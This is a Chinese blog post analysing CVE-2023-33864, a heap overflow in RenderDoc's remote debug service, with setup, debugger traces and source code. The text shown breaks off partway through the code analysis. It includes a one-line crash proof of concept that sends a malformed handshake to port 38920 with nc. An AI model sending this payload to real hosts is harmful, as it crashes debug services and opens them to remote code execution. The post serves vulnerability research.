<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="http://localhost:4000/assets/fonts/fonts.css"/>
<link rel="stylesheet" href="http://localhost:4000/assets/style.css"/>
<link rel="stylesheet" href="http://localhost:4000/assets/js/lity.min.css"/>



<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<meta property="og:site_name" content="极目楚天舒" />
<meta 
    property="og:title"
    content="
        
            CVE-2023-33864 RenderDoc堆溢出漏洞分析
        
    " 
/>

<meta property="og:url" content="http://localhost:4000//userspace/2025/05/27/CVE-2023-33864-RenderDoc%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" />

    <meta property="og:type" content="article" />



    <meta property="fb:app_id" content="" />



<title>
    
        CVE-2023-33864 RenderDoc堆溢出漏洞分析
    
</title>
</head>
<body class="index">
    
        <div class="page-container">
            <aside class="main-sidebar">
                <!-- 包含 TOC -->
                <sidebar class="sidebar">
<ul class="toc-list"><li><a href="#漏洞信息">漏洞信息</a><ul><li><a href="#目标信息">目标信息</a></li><li><a href="#漏洞信息-1">漏洞信息</a></li><li><a href="#我们的工作">我们的工作</a></li></ul></li><li><a href="#环境搭建">环境搭建</a></li><li><a href="#漏洞复现">漏洞复现</a><ul><li><a href="#开启librenderdoc服务">开启librenderdoc服务</a></li><li><a href="#宿主机模拟远程攻击">宿主机模拟远程攻击</a></li></ul></li><li><a href="#漏洞分析">漏洞分析</a><ul><li><a href="#漏洞原理">漏洞原理</a></li><li><a href="#握手包的结构">握手包的结构</a></li><li><a href="#io-过程分析">I/O 过程分析</a><ul><li><a href="#io相关的数据结构与算法">I/O相关的数据结构与算法</a></li><li><a href="#超长-client-name-的处理">超长 client name 的处理</a></li></ul></li><li><a href="#漏洞产生的深层次原因">漏洞产生的深层次原因</a></li></ul></li><li><a href="#漏洞利用">漏洞利用</a><ul><li><a href="#堆的控制能力">堆的控制能力</a><ul><li><a href="#堆溢出能力">堆溢出能力</a></li><li><a href="#堆排布能力">堆排布能力</a></li></ul></li><li><a href="#漏洞利用思路">漏洞利用思路</a></li><li><a href="#漏洞利用代码">漏洞利用代码</a></li></ul></li><li><a href="#pwndbg命令学习">pwndbg命令学习</a></li><li><a href="#参考资料">参考资料</a></li></ul></sidebar>
            </aside>
            <!-- 主内容区域 -->
            <main class="main-content">
                <header class="header">
    <section class="logo">
        <a href="http://localhost:4000/" class="logo__link">
            
                <h1>极目楚天舒</h1>
            
        </a>
    </section>
    
    <button id="menuToggle">
        <div></div>
        <div></div>
        <div></div>
    </button>
    <nav class="menu">
        
<ul class="list primary">

    
        <li class="item">

            <div class="item-controls">
                <a href="http://localhost:4000/category/linux_kernel.html">
                
                    <img src="http://localhost:4000/assets/img/icons/tux.png"/>
                
                
                    <p style="color: var(--c-themeHueRed)">Linux kernel</p>
                
                </a>

            
            </div>
            
        </li>   
    
        <li class="item">

            <div class="item-controls">
                <a href="http://localhost:4000/category/linux_userspace.html">
                
                    <img src="http://localhost:4000/assets/img/icons/userspace.png"/>
                
                
                    <p style="color: var(--c-themeHueRed)">Linux userspace</p>
                
                </a>

            
            </div>
            
        </li>   
    
        <li class="item">

            <div class="item-controls">
                <a href="http://localhost:4000/category/hardware.html">
                
                    <img src="http://localhost:4000/assets/img/icons/chip.svg"/>
                
                
                    <p style="color: var(--c-themeHueRed)">Hardware</p>
                
                </a>

            
            </div>
            
        </li>   
    
        <li class="item">

            <div class="item-controls">
                <a href="http://localhost:4000/category/meltdown_spectre.html">
                
                    <img src="http://localhost:4000/assets/img/icons/meltdown_spectre.png"/>
                
                
                    <p style="color: var(--c-themeHueRed)">Side Channel</p>
                
                </a>

            
            </div>
            
        </li>   
    
        <li class="item">

            <div class="item-controls">
                <a href="http://localhost:4000/category/riscv.html">
                
                    <img src="http://localhost:4000/assets/img/icons/riscv.png"/>
                
                
                    <p style="color: var(--c-themeHueRed)">Riscv</p>
                
                </a>

            
            </div>
            
        </li>   
    
</ul>
    </nav>
</header>
                
                <article class="post">

    <div class="post__title">
       CVE-2023-33864 RenderDoc堆溢出漏洞分析
    </div>
    <div class="post__meta"> 
        <div class="post__meta__category">
            
                <p class="post__meta__category__title" style="background: var(--c-themeHueRed)">Userspace</p>
            
        </div>
        <p class="post__meta__divider">·</p>
        <div class="post__meta__date">
            May 27, 2025
        </div>
        
    </div>

    
    <div class="post__content">
        <p>RenderDoc 是一款开源的图形调试工具，主要用于实时捕获、分析和调试 OpenGL 和 OpenGL ES 等图形 API 的渲染过程。它被广泛应用于 游戏开发、图形引擎优化、GPU 驱动问题排查等领域，支持 Windows、Linux 和 Android 平台。</p>

<h1 id="漏洞信息">漏洞信息</h1>

<h2 id="目标信息">目标信息</h2>

<p>CVE-2023-33864 是 renderdoc 软件的整数溢出导致的堆溢出漏洞，漏洞存在于1.27版本之前的renderdoc中，可以使攻击者绕过系统的地址随机化保护，实现远程任意代码执行。</p>

<p>RenderDoc 是一款开源的图形调试工具，主要用于实时捕获、分析和调试 OpenGL 和 OpenGL ES 等图形 API 的渲染过程。它被广泛应用于 游戏开发、图形引擎优化、GPU 驱动问题排查等领域，支持 Windows、Linux 和 Android 平台。</p>

<p>RenderDoc 是CS架构，分为两部分，一部分是图形化的调试界面，作为client使用；另一部分是调试服务作为server端使用。</p>

<p>服务端以 librenderdoc.so 的形式向 client 提供调试服务。</p>

<p>client 既可以从本地加载 <a href="http://libcrenderdoc.so">libcrenderdoc.so</a>，调用其中的API，进行本地调试；</p>

<p>client 又可以从远程通过 38920 tcp 端口连接到 <a href="http://libcrenderdoc.so">libcrenderdoc.so</a> ，进行远程调试；</p>

<p>所以漏洞出现在 librenderdoc.so 的 TCP 服务部分。</p>

<p><a href="http://librenderdoc.so">librenderdoc.so</a> 在被 ld 链接器加载的过程中，会执行自身的初始化函数，在初始化的时候会起一个 TCP 监听端口 38920，接收远程的调试请求。</p>

<h2 id="漏洞信息-1">漏洞信息</h2>

<p><a href="https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt">www.qualys.com</a></p>

<p>漏洞存在的位置是renderdoc私有的远程调试协议，该协议基于TCP协议。</p>

<p>当client向server请求建立调试的过程中，client首先向server发送表明自身身份的标识“client name”，server在处理“client name”的时候发生了整数溢出，进而造成了堆溢出。</p>

<p>漏洞能力：</p>

<ol>
  <li>任意长度的堆溢出；</li>
  <li>溢出内容攻击者完全可控；</li>
  <li>没有 NULL 字符截断；</li>
</ol>

<p>漏洞技巧：</p>

<p>House-of-Muney-Heap-Exploitation</p>

<p><a href="http://tukan.farm/2016/07/27/munmap-madness/">munmap madness · Online tukan sanctuary</a></p>

<h2 id="我们的工作">我们的工作</h2>

<p>该漏洞由 Qualys 团队发现，该团队提出了漏洞利用思路，但是没有公开漏洞利用代码。</p>

<p>我们开发出了漏洞EXP，该EXP可以实现稳定的利用，在 libc-2.31 环境下完成了测试。</p>

<h1 id="环境搭建">环境搭建</h1>

<p>源码下载：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/baldurk/renderdoc.git
<span class="nv">$ </span><span class="nb">cd </span>renderdoc
<span class="nv">$ </span>git tag
<span class="nv">$ </span>git checkout v1.26
</code></pre></div></div>

<p>库文件安装：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>libx11-6 libx11-dev libxcb1 libxcb1-dev <span class="se">\</span>
    libxcb-keysyms1 libxcb-keysyms1-dev <span class="se">\ </span>   
    mesa-common-dev libgl1-mesa-dev <span class="se">\ </span>   
    libpcre3-dev qt5-qmake python3-dev 
</code></pre></div></div>

<p>源码编译：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd </span>renderdoc
<span class="nv">$ </span>cmake <span class="nt">-DCMAKE_BUILD_TYPE</span><span class="o">=</span>Debug <span class="nt">-Bbuild</span> <span class="nt">-H</span><span class="nb">.</span>
<span class="nv">$ </span>make <span class="nt">-C</span> build
</code></pre></div></div>

<h1 id="漏洞复现">漏洞复现</h1>

<h2 id="开启librenderdoc服务">开启librenderdoc服务</h2>

<p>载入librenderdoc.so动态链接库并调用strace进行系统调用跟踪：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">test</span>@530ebd686b7d:/test<span class="nv">$ </span>strace <span class="nt">-f</span> <span class="nt">-o</span> strace.out <span class="nt">-E</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>/your/real/path/librenderdoc.so <span class="nb">sleep </span>600
</code></pre></div></div>

<ul>
  <li>strace：Linux 系统调用追踪工具，用于监控进程与内核的交互（如文件操作、进程管理等）。
    <ul>
      <li>-f：追踪子进程（fork/clone 创建的进程）。</li>
      <li>-o strace.out：将输出保存到文件 strace.out。</li>
      <li>-E LD_PRELOAD=/your/real/path/librenderdoc.so：设置环境变量 LD_PRELOAD（仅对 strace 启动的进程生效）。</li>
    </ul>
  </li>
  <li>sleep 600：被追踪的目标进程（休眠600秒）。</li>
</ul>

<p>可以看到本地打开了38920监听端口，docker端地址为172.17.0.2，server的线程号为2991：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">test</span>@530ebd686b7d:/test<span class="nv">$ </span>netstat <span class="nt">-ltup</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:38920           0.0.0.0:<span class="k">*</span>               LISTEN      2811/sleep 
<span class="nb">test</span>@530ebd686b7d:<span class="nv">$ </span>ifconfig
eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fda0:123d:b02a::2  prefixlen 64  scopeid 0x0&lt;global&gt;
        inet6 fe80::fc90:fbff:fe2c:f71e  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether fe:90:fb:2c:f7:1e  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 7460  bytes 30911657 <span class="o">(</span>30.9 MB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3399  bytes 201607 <span class="o">(</span>201.6 KB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
<span class="nb">test</span>@530ebd686b7d:/test<span class="nv">$ </span>ps <span class="nt">-eLf</span>
UID          PID    PPID     LWP  C NLWP STIME TTY          TIME CMD
....
<span class="nb">test        </span>2989    2914    2989  0    2 09:09 pts/2    00:00:00 /usr/bin/sleep 6000
<span class="nb">test        </span>2989    2914    2991  0    2 09:09 pts/2    00:00:00 /usr/bin/sleep 6000
<span class="nb">test        </span>2992    2971    2992  0    1 09:09 pts/6    00:00:00 ps <span class="nt">-eLf</span>
</code></pre></div></div>

<p>载入librenderdoc.so动态链接库时会开启tcp服务端，监听38920端口。</p>

<h2 id="宿主机模拟远程攻击">宿主机模拟远程攻击</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span>
  <span class="nb">printf</span> <span class="s1">'\2\0\0\0\0\0\0\0\1\0\0\0\x80\x00\xa0\x00%010485760x'</span> 1<span class="p">;</span>   <span class="c"># 第一部分：构造头部+填充数据</span>
  <span class="nb">sleep </span>3<span class="p">;</span>                                                          <span class="c"># 延迟3秒</span>
  <span class="nb">printf</span> <span class="s1">'%0128x%04096x'</span> 1 1                                        <span class="c"># 第二部分：附加填充数据</span>
<span class="o">)</span> | nc <span class="nt">-nv</span> 172.17.0.2 38920                                         <span class="c"># 发送到目标端口</span>
</code></pre></div></div>

<p>可以看到docker端的服务已经被打崩：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-13_155029.png" alt="批注 2025-05-13 155029.png" /></p>

<p>检查strace的输出：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2847  recvfrom<span class="o">(</span>5, <span class="s2">"00000000000000000000000000000000"</span>..., 128, 0, NULL, NULL<span class="o">)</span> <span class="o">=</span> 128
2847  fcntl<span class="o">(</span>5, F_GETFL<span class="o">)</span>                 <span class="o">=</span> 0x2 <span class="o">(</span>flags O_RDWR<span class="o">)</span>
2847  fcntl<span class="o">(</span>5, F_SETFL, O_RDWR|O_NONBLOCK<span class="o">)</span> <span class="o">=</span> 0
2847  setsockopt<span class="o">(</span>5, SOL_SOCKET, SO_RCVTIMEO_OLD, <span class="s2">"</span><span class="se">\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><span class="s2">"</span>, 16<span class="o">)</span> <span class="o">=</span> 0
2847  recvfrom<span class="o">(</span>5, <span class="s2">"00000000000000000000000000000000"</span>..., 4284546928, 0, NULL, NULL<span class="o">)</span> <span class="o">=</span> 4096
2847  writev<span class="o">(</span>2, <span class="o">[{</span><span class="nv">iov_base</span><span class="o">=</span><span class="s2">"malloc(): corrupted top size"</span>, <span class="nv">iov_len</span><span class="o">=</span>28<span class="o">}</span>, <span class="o">{</span><span class="nv">iov_base</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, <span class="nv">iov_len</span><span class="o">=</span>1<span class="o">}]</span>, 2<span class="o">)</span> <span class="o">=</span> 29
2847  mmap<span class="o">(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="nt">-1</span>, 0<span class="o">)</span> <span class="o">=</span> 0x7f59a2e59000
2847  rt_sigprocmask<span class="o">(</span>SIG_UNBLOCK, <span class="o">[</span>ABRT], NULL, 8<span class="o">)</span> <span class="o">=</span> 0
2847  rt_sigprocmask<span class="o">(</span>SIG_BLOCK, ~[RTMIN RT_1], <span class="o">[]</span>, 8<span class="o">)</span> <span class="o">=</span> 0
2847  getpid<span class="o">()</span>                          <span class="o">=</span> 2846
2847  gettid<span class="o">()</span>                          <span class="o">=</span> 2847
2847  tgkill<span class="o">(</span>2846, 2847, SIGABRT<span class="o">)</span>       <span class="o">=</span> 0
2847  rt_sigprocmask<span class="o">(</span>SIG_SETMASK, <span class="o">[]</span>, NULL, 8<span class="o">)</span> <span class="o">=</span> 0
2847  <span class="nt">---</span> SIGABRT <span class="o">{</span><span class="nv">si_signo</span><span class="o">=</span>SIGABRT, <span class="nv">si_code</span><span class="o">=</span>SI_TKILL, <span class="nv">si_pid</span><span class="o">=</span>2846, <span class="nv">si_uid</span><span class="o">=</span>1000<span class="o">}</span> <span class="nt">---</span>
2846  &lt;... clock_nanosleep resumed&gt; &lt;unfinished ...&gt;<span class="o">)</span> <span class="o">=</span> ?
2847  +++ killed by SIGABRT <span class="o">(</span>core dumped<span class="o">)</span> +++
2846  +++ killed by SIGABRT <span class="o">(</span>core dumped<span class="o">)</span> +++
</code></pre></div></div>

<p>漏洞现场：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pwndbg /usr/bin/sleep          <span class="c"># 先挂在sleep程序上面进行调试</span>
pwndbg&gt; <span class="nb">set </span>environment LD_PRELOAD /test/renderdoc/build/lib/librenderdoc.so <span class="c"># 手动加载库文件                                                                                                                                                                                                        </span>
pwndbg&gt; r 600   
Starting program: /usr/bin/sleep 600                                                                                                                                                                                                                                                
warning: Error disabling address space randomization: Operation not permitted                                                                                                                                                                                                       
warning: could not convert <span class="s1">'rb_root'</span> from the host encoding <span class="o">(</span>UTF-8<span class="o">)</span> to UTF-32.                                                                                                                                                                                                      
This normally should not happen, please file a bug report.                                                                                                                                                                                                                          
<span class="o">[</span>Thread debugging using libthread_db enabled]                                                                                                                                                                                                                                       
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>                                                                                                                                                                                                          
<span class="o">[</span>New Thread 0x7f49e7890700 <span class="o">(</span>LWP 2932<span class="o">)]</span>      <span class="c"># librenderdoc.so起了tcp进程                                                                                                                                                                                                                                        </span>
malloc<span class="o">()</span>: corrupted top size 
Thread 2 <span class="s2">"TargetControlSe"</span> received signal SIGABRT, Aborted.                                                                                                                                                                                                                        
<span class="o">[</span>Switching to Thread 0x7f49e7890700 <span class="o">(</span>LWP 2932<span class="o">)]</span>                                                                                                                                                                                                                                     
__GI_raise <span class="o">(</span><span class="nv">sig</span><span class="o">=</span>sig@entry<span class="o">=</span>6<span class="o">)</span> at ../sysdeps/unix/sysv/linux/raise.c:50                                                                                                                                                                                                               
warning: 50     ../sysdeps/unix/sysv/linux/raise.c: No such file or directory                                                                                                                                                                                                       
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA                                                                                                                                                                                                                                    
_______________________________________________________________________________________________________________[ REGISTERS / show-flags off / show-compact-regs off <span class="o">]</span>_______________________________________________________________________________________________________________
 RAX  0
 RBX  0x7f49e7890700 __ 0x7f49e7890700
 RCX  0x7f49e7de500b <span class="o">(</span>raise+203<span class="o">)</span> __ mov rax, qword ptr <span class="o">[</span>rsp + 0x108]
 RDX  0
 RDI  2
 RSI  0x7f49e788f450 __ 0
 R8   0
 R9   0x7f49e788f450 __ 0
 R10  8
 R11  0x246
 R12  0x7f49ed0a2000 __ 0x6c6c616d00001000
 R13  0x7f49e788f6c0 __ 0x7f49e788f6d0 __ 0x7f49e7f5929a __ 0x203a646d6372000a /<span class="k">*</span> <span class="s1">'\n'</span> <span class="k">*</span>/
 R14  0x1000
 R15  1
 RBP  0x7f49e788f7a0 __ 0x1c
 RSP  0x7f49e788f450 __ 0
 RIP  0x7f49e7de500b <span class="o">(</span>raise+203<span class="o">)</span> __ mov rax, qword ptr <span class="o">[</span>rsp + 0x108]
________________________________________________________________________________________________________________________[ DISASM / x86-64 / <span class="nb">set </span>emulate on <span class="o">]</span>________________________________________________________________________________________________________________________
 _ 0x7f49e7de500b &lt;raise+203&gt;    mov    rax, qword ptr <span class="o">[</span>rsp + 0x108]     RAX, <span class="o">[</span>0x7f49e788f558] <span class="o">=&gt;</span> 0x3a9e059a88559600
   0x7f49e7de5013 &lt;raise+211&gt;    xor    rax, qword ptr fs:[0x28]         RAX <span class="o">=&gt;</span> 0 <span class="o">(</span>0x3a9e059a88559600 ^ 0x3a9e059a88559600<span class="o">)</span>
   0x7f49e7de501c &lt;raise+220&gt;    jne    raise+260                   &lt;raise+260&gt;
  
   0x7f49e7de501e &lt;raise+222&gt;    mov    eax, r8d       EAX <span class="o">=&gt;</span> 0
   0x7f49e7de5021 &lt;raise+225&gt;    add    rsp, 0x118     RSP <span class="o">=&gt;</span> 0x7f49e788f568 <span class="o">(</span>0x7f49e788f450 + 0x118<span class="o">)</span>
   0x7f49e7de5028 &lt;raise+232&gt;    ret                                &lt;abort+299&gt;
    _
   0x7f49e7dc4859 &lt;abort+299&gt;    mov    rbx, qword ptr fs:[0x10]            RBX, <span class="o">[</span>0x7f49e7890710] <span class="o">=&gt;</span> 0x7f49e7890700 __ 0x7f49e7890700
   0x7f49e7dc4862 &lt;abort+308&gt;    cmp    qword ptr <span class="o">[</span>rip + 0x1cb3ef], rbx     0x0 - 0x7f49e7890700     EFLAGS <span class="o">=&gt;</span> 0x287 <span class="o">[</span> CF PF af zf SF IF <span class="nb">df </span>of <span class="o">]</span>
   0x7f49e7dc4869 &lt;abort+315&gt;    je     abort+379                   &lt;abort+379&gt;
  
   0x7f49e7dc486b &lt;abort+317&gt;    mov    eax, dword ptr fs:[0x18]            EAX, <span class="o">[</span>0x7f49e7890718] <span class="o">=&gt;</span> 1
   0x7f49e7dc4873 &lt;abort+325&gt;    <span class="nb">test   </span>eax, eax                            1 &amp; 1     EFLAGS <span class="o">=&gt;</span> 0x202 <span class="o">[</span> cf pf af zf sf IF <span class="nb">df </span>of <span class="o">]</span>
_____________________________________________________________________________________________________________________________________[ STACK <span class="o">]</span>______________________________________________________________________________________________________________________________________
00:0000_ rsi r9 rsp 0x7f49e788f450 __ 0
... _               7 skipped
___________________________________________________________________________________________________________________________________[ BACKTRACE <span class="o">]</span>____________________________________________________________________________________________________________________________________
 _ 0   0x7f49e7de500b raise+203
   1   0x7f49e7dc4859 abort+299
   2   0x7f49e7e2f266 __libc_message+662
   3   0x7f49e7e372fc None
   4   0x7f49e7e3a6ba _int_malloc+3146
   5   0x7f49e7e3c299 malloc+441
   6   0x7f49e7ad3b29 operator new<span class="o">(</span>unsigned long<span class="o">)</span>+25
   7   0x7f49e968d3ba StringFormat::sntimef<span class="o">(</span>long, char const<span class="k">*</span><span class="o">)</span>+133
_______________________________________________________________________________________________________________________________[ THREADS <span class="o">(</span>2 TOTAL<span class="o">)</span> <span class="o">]</span>________________________________________________________________________________________________________________________________
  _ 2   <span class="s2">"TargetControlSe"</span> stopped: 0x7f49e7de500b &lt;raise+203&gt; 
    1   <span class="s2">"sleep"</span>           stopped: 0x7f49e7e7f23f &lt;clock_nanosleep+223&gt; 
____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
pwndbg&gt; bt
<span class="c">#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50</span>
<span class="c">#1  0x00007f49e7dc4859 in __GI_abort () at abort.c:79</span>
<span class="c">#2  0x00007f49e7e2f266 in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7f49e7f59298 "%s\n") at ../sysdeps/posix/libc_fatal.c:156</span>
<span class="c">#3  0x00007f49e7e372fc in malloc_printerr (str=str@entry=0x7f49e7f57569 "malloc(): corrupted top size") at malloc.c:5347</span>
<span class="c">#4  0x00007f49e7e3a6ba in _int_malloc (av=av@entry=0x7f49e0000020, bytes=bytes@entry=28) at malloc.c:4107</span>
<span class="c">#5  0x00007f49e7e3c299 in __GI___libc_malloc (bytes=28) at malloc.c:3066</span>
<span class="c">#6  0x00007f49e7ad3b29 in operator new(unsigned long) () from /lib/x86_64-linux-gnu/libstdc++.so.6</span>
<span class="c">#7  0x00007f49e968d3ba in StringFormat::sntimef (utcTime=1747123722, format=0x7f49e993c364 "[%H:%M:%S] ") at /test/renderdoc/renderdoc/os/posix/posix_stringio.cpp:610                                                </span>
<span class="c">#8  0x00007f49e902535d in rdclog_direct (utcTime=1747123722, pid=2928, type=LogType::Comment, project=0x7f49e99486bf "RDOC", file=0x7f49e9948940 "/test/renderdoc/renderdoc/core/target_control.cpp", line=489, fmt=0x7f49e9948ae8 "Invalid/Unsupported handshake '%s' / %d")</span>
    at /test/renderdoc/renderdoc/common/common.cpp:391
<span class="c">#9  0x00007f49e9143228 in RenderDoc::TargetControlServerThread (sock=0x56319210be70) at /test/renderdoc/renderdoc/core/target_control.cpp:489</span>
<span class="c">#10 0x00007f49e9045ed1 in &lt;lambda()&gt;::operator()(void) const (__closure=0x7f49e788feb0) at /test/renderdoc/renderdoc/core/core.cpp:456</span>
<span class="c">#11 0x00007f49e905081c in std::_Function_handler&lt;void(), RenderDoc::Initialise()::&lt;lambda()&gt; &gt;::_M_invoke(const std::_Any_data &amp;) (__functor=...) at /usr/include/c++/9/bits/std_function.h:300</span>
<span class="c">#12 0x00007f49e851ceec in std::function&lt;void()&gt;::operator() (this=0x7f49e788feb0) at /usr/include/c++/9/bits/std_function.h:688</span>
<span class="c">#13 0x00007f49e968da8d in Threading::sThreadInit (init=0x56319210bf40) at /test/renderdoc/renderdoc/os/posix/posix_threading.cpp:173</span>
<span class="c">#14 0x00007f49e7c13609 in start_thread (arg=&lt;optimized out&gt;) at pthread_create.c:477</span>
<span class="c">#15 0x00007f49e7ec1353 in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95</span>
</code></pre></div></div>

<p>栈回溯信息：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-13_161522.png" alt="批注 2025-05-13 161522.png" /></p>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="漏洞原理">漏洞原理</h2>

<p>librenderdoc.so 初始化过程中会起一个 TCP 服务线程作为server，线程主体是TargetControlServerThread函数。该函数内部是一个 while 循环，每隔5秒钟检查一次是否有客户端连接到38920端口。</p>

<p>server 实例化一个 StreamReader 对象 ser 用于和 client 交互。ser对象里面封装了 client 的网络句柄、接收缓冲区、读写指针等。</p>

<p>从数据包解析 版本号、clientname、是否杀死已有的调试线程这3个信息。</p>

<p>成功解析以上3个信息之后，若当前 server 端没有调试线程，那么为 client 起一个新的调试线程；</p>

<p>若当前 server 端已经存在了调试线程，若 kick = true，为当前的 client 起一个新线程来代替旧线程。</p>

<p>若当前 server 端已经存在了调试线程，若 kick = false，那么继续保留旧线程，并且把就线程的名称返回给 client，告知 client 已有线程存在。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">RenderDoc</span><span class="o">::</span><span class="n">TargetControlServerThread</span><span class="p">(</span><span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">SetCurrentThreadName</span><span class="p">(</span><span class="s">"TargetControlServerThread"</span><span class="p">);</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">KeepModuleAlive</span><span class="p">();</span>
  <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_SingleClientName</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
  <span class="n">Threading</span><span class="o">::</span><span class="n">ThreadHandle</span> <span class="n">clientThread</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_ControlClientThreadShutdown</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
  <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">RenderDoc</span><span class="o">::</span><span class="n">Inst</span><span class="p">().</span><span class="n">m_TargetControlThreadShutdown</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">client</span> <span class="o">=</span> <span class="n">sock</span><span class="o">-&gt;</span><span class="n">AcceptClient</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">client</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">Connected</span><span class="p">())</span>
      <span class="p">{</span>
        <span class="n">RDCERR</span><span class="p">(</span><span class="s">"Error in accept - shutting down server"</span><span class="p">);</span>

        <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
        <span class="n">Threading</span><span class="o">::</span><span class="n">ReleaseModuleExitThread</span><span class="p">();</span>
        <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="n">Threading</span><span class="o">::</span><span class="n">Sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">rdcstr</span> <span class="n">existingClient</span><span class="p">;</span>
    <span class="n">rdcstr</span> <span class="n">newClient</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">version</span><span class="p">;</span>
    <span class="kt">bool</span> <span class="n">kick</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

    <span class="c1">// receive handshake from client and get its name</span>
    <span class="p">{</span>
      <span class="n">ReadSerialiser</span> <span class="n">ser</span><span class="p">(</span><span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">Ownership</span><span class="o">::</span><span class="n">Nothing</span><span class="p">),</span> <span class="n">Ownership</span><span class="o">::</span><span class="n">Stream</span><span class="p">);</span>
      <span class="n">PacketType</span> <span class="n">type</span> <span class="o">=</span> <span class="n">ser</span><span class="p">.</span><span class="n">ReadChunk</span><span class="o">&lt;</span><span class="n">PacketType</span><span class="o">&gt;</span><span class="p">();</span>

      <span class="k">if</span><span class="p">(</span><span class="n">type</span> <span class="o">!=</span> <span class="n">ePacket_Handshake</span><span class="p">)</span>
      <span class="p">{</span>
        <span class="n">SAFE_DELETE</span><span class="p">(</span><span class="n">client</span><span class="p">);</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="p">}</span>

      <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">version</span><span class="p">);</span>
      <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">newClient</span><span class="p">);</span>
      <span class="n">SERIALISE_ELEMENT</span><span class="p">(</span><span class="n">kick</span><span class="p">);</span>

      <span class="n">ser</span><span class="p">.</span><span class="n">EndChunk</span><span class="p">();</span>

      <span class="k">if</span><span class="p">(</span><span class="n">newClient</span><span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="o">||</span> <span class="o">!</span><span class="n">IsProtocolVersionSupported</span><span class="p">(</span><span class="n">version</span><span class="p">))</span>
      <span class="p">{</span>
        <span class="n">RDCLOG</span><span class="p">(</span><span class="s">"Invalid/Unsupported handshake '%s' / %d"</span><span class="p">,</span> <span class="n">newClient</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">version</span><span class="p">);</span>
